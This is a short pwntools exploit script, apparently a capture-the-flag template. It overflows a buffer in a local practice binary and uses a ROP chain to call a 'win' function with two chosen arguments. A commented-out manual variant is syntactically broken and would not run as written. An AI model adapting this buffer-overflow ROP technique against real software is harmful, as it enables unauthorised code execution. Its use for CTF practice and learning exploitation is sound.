from pwn import *

exe = './vuln' #name of 64bit program
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'
#p = remote('IP/hostnmame', port)
p = process(exe)
offset = 112 # obtain from gef: Refer to ./README.md 
p.recvuntil(": \n") # adjust according to received input

# NOTE: Need to find a ROP gadgets to slot arguments into registers (rdi/rsi) instead of just putting after RA for 32 bit 
arg1 = 0xCAFEF00DCAFEF00D 
arg2 = 0xF00DF00DF00DF00D

# padding + pop_rdi + param_1 + pop_rsi_r15 + param_2 + junk  + function
# need to make sure all the parameters in place BEFORE calling the function! 
    
# manual non-rop method    
''' 
flag_func = elf.symbols['win'])  
payload = flat({
    offset: [
    pop_rdi
    arg1
    pop_rsi_r15 # if we can't find pop_rsi alone gadget 
    arg2
    0x0
    flag_func
})
'''
rop = ROP(elf)
rop.win(arg1,arg2) # replace 'win' with desired function to jump to

pprint(rop.dump()) # to see the payload 

payload = flat({
    offset: rop.chain()
})

p.sendline(payload)
p.interactive()
